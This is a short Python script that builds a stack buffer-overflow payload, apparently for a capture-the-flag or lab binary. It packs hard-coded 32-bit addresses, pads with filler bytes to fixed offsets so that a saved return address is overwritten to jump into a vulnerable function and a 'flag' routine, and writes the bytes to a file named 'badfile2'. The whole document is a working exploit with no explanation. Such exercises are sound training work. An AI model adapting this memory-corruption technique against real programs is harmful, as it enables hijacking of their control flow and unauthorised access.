import struct 

flag = struct.pack("I", 0x8048532)
flagvalue = struct.pack("I", 0x0804a18c)
string_addr = struct.pack("I", 0x0804a060)
vuln_addr = struct.pack("I", 0x804849b)
offset_getinput = 160

p0 = struct.pack("I",0xdeadbeef)
p0 += 'a' * (128 -len(p0))
p0 += flagvalue
p0 += '\n'

p = 'a' * 11
p += 'b'
p += 'c'
p += 'd' * (148-len(p))
p += string_addr
p += 'd' * (160 - len(p))
p += vuln_addr
p += flag

payload = (p0 + p)

with open("badfile2", "wb" ) as f:
	f.write(payload)
